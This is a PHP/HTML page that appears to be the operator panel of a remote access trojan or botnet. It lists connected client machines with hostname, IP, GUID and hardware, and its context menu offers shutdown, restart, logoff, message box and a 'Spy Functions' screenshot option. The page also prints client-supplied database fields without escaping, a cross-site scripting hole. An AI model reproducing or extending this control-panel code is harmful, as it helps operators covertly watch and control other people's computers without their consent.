<head>
<link rel="stylesheet" type="text/css" href="css/msgbox.css">
<script src="js/bootstrap-table.js"></script>
<script src="js/bootstrap-table-contextmenu.js"></script>
</head>
<body>
    <div class="container">
      <div class="row">
        <table id='grid'>
            <thead>
              <tr>
                <th data-field='cid'>Client ID</th>
                <th data-field='hostname'>Hostname</th>
                <th data-field='ipaddress'>IP Address</th>
                <th data-field='guid'>GUID</th>
                <th data-field='OS'>Operating System</th>
                <th data-field='RAM'>RAM</th>
                <th data-field='CPU'>Processor</th>
                <th data-field='GPU'>Graphics Card</th>
                <th data-field='ping'>Ping</th>
                <th data-field='cmd'></th>
              </tr>
            </thead>
            <tbody>
            <?php
              $sql = "SELECT * FROM clients WHERE online = '1'";
              $query = mysqli_query($connect, $sql);
              if (mysqli_num_rows($query) != 0) {
                while($rows = mysqli_fetch_array($query)) {
                  echo "<tr><td>".$rows['cid']."</td>
                        <td>".$rows['hostname']."</td>
                        <td>".$rows['ipaddress']."</td>
                        <td>".$rows['guid']."</td>
                        <td>".$rows['os']."</td>
                        <td>".$rows['ram']."</td>
                        <td>".$rows['processor']."</td>
                        <td>".$rows['gpu']."</td>
                        <td>".$rows['ping']."</td>
                        <td><a id ='msgbox".$rows['cid']."' data-fancybox data-type='iframe' data-src='/commands/msg.php?cid=".$rows['guid']."' href='javascript:;'></a></td>";
                }
              } 
            ?>
            </tbody>
        </table>
        <a id ='msgbox' data-fancybox data-type="iframe" data-src="/commands/msg.php" href="javascript:;"></a>
      </div>  
    </div>
  
    <!-- context menu -->
    <ul id="context-menu" class="dropdown-menu">
    <h3 class="dropdown-header">Computer Power</h3>
    <li data-item="shutdown"><a>Shutdown</a></li>
    <li data-item="restart"><a>Restart</a></li>
    <li data-item="logoff"><a>Logoff</a></li>
    <div class="dropdown-divider"></div>
    <h3 class="dropdown-header">Communications</h3>
    <li data-item="msgbox"><a>Message Box</a></li>
    
    <div class="dropdown-divider"></div>
    <h3 class="dropdown-header">Spy Functions</h3>
    <li data-item="screenshot"><a>Take screenshot</a></li>
    </ul>  

    <script>
	  $(function() {
		  $('#grid').bootstrapTable({
			  contextMenu: '#context-menu',
			  onContextMenuItem: function(row, $el){
				  if($el.data("item") == "msgbox"){
            document.getElementById("msgbox" + row.cid).click();
				  }
			  }
		  });
	  });
    </script>
</body>